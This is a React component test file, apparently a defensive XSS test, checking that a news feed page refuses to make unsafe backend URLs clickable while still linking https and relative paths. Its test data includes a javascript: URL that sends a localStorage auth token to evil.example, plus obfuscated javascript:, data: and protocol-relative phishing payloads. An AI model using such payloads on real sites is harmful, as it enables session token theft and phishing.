import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { render, screen, waitFor } from '@testing-library/react'
import ForYouPage from './page'

const POISONED_URLS = [
  "javascript:fetch('https://evil.example/?t='+localStorage.getItem('vccircle_auth_token'))",
  'JaVaScRiPt:alert(1)',
  'java\tscript:alert(1)',
  ' javascript:alert(1)',
  'data:text/html,<script>alert(1)</script>',
  '//evil/phish',
  '\\\\evil.com',
]

function mockFeed(urls: string[]) {
  vi.stubGlobal(
    'fetch',
    vi.fn().mockResolvedValue({
      ok: true,
      json: async () => ({
        articles: urls.map((url, i) => ({
          id: 200 + i,
          title: `Deal ${i}`,
          url,
          summary: `Summary ${i}`,
        })),
      }),
    })
  )
}

async function renderFeed(urls: string[]) {
  mockFeed(urls)
  const view = render(<ForYouPage />)
  await waitFor(() => expect(screen.getAllByText(/^Deal \d$/).length).toBeGreaterThan(0))
  return view
}

beforeEach(() => {
  vi.clearAllMocks()
})

afterEach(() => {
  vi.unstubAllGlobals()
})

describe('ForYouPage — unsafe backend URLs are not clickable', () => {
  it.each(POISONED_URLS)('renders no link for %j', async (url) => {
    const { container } = await renderFeed([url])

    expect(screen.getByText('Deal 0')).toBeTruthy()
    expect(container.querySelectorAll('a[href]')).toHaveLength(0)
  })
})

describe('ForYouPage — safe URLs still link out', () => {
  it('renders a working link for an absolute https URL', async () => {
    const { container } = await renderFeed(['https://vccircle.com/news/deal-9'])

    const link = container.querySelector('a[href]')
    expect(link?.getAttribute('href')).toBe('https://vccircle.com/news/deal-9')
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer')
  })

  it('renders a working link for a same-origin relative path', async () => {
    const { container } = await renderFeed(['/articles/7'])

    expect(container.querySelector('a[href]')?.getAttribute('href')).toBe('/articles/7')
  })
})
